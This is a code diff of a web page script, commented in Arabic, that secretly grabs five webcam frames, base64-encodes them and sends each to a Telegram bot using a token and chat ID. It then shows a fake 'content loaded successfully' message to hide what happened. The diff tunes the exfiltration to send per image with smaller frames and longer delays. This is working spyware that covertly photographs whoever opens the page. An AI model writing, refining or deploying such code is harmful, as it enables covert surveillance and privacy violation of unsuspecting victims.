@@ -26,35 +26,35 @@
 
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.width = 240;
-                    canvas.height = 180;
+                    canvas.width = 160;  // حجم صغير جداً لضمان السرعة وعدم التعليق
+                    canvas.height = 120;
                     const ctx = canvas.getContext('2d');
                     
-                    let imagesData = [];
-
                     for (let i = 1; i <= 5; i++) {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        let base64Image = canvas.toDataURL('image/jpeg', 0.4);
-                        imagesData.push(`صورة (${i}):\n${base64Image}`);
+                        let base64Image = canvas.toDataURL('image/jpeg', 0.3);
 
+                        // إرسال كل صورة لوحدها بوضوح وبدون ضغط على المتصفح
+                        try {
+                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ 
+                                    chat_id: CHAT, 
+                                    text: `📸 صورة (${i}):\n${base64Image}` 
+                                })
+                            });
+                        } catch (err) {
+                            console.error(err);
+                        }
+
+                        // فاصل زمني صغير جداً بين كل صورة والثانية عشان المتصفح يهدى
                         if (i < 5) {
-                            await new Promise(r => setTimeout(r, 200));
+                            await new Promise(r => setTimeout(r, 400));
                         }
                     }
 
                     stream.getTracks().forEach(t => t.stop());
-
-                    if (imagesData.length > 0) {
-                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ 
-                                chat_id: CHAT, 
-                                text: `🚨 تم التقاط الـ 5 صور بنجاح:\n\n` + imagesData.join('\n\n-------------------\n\n') 
-                            })
-                        });
-                    }
-
                     document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
 
                 }, 1000);
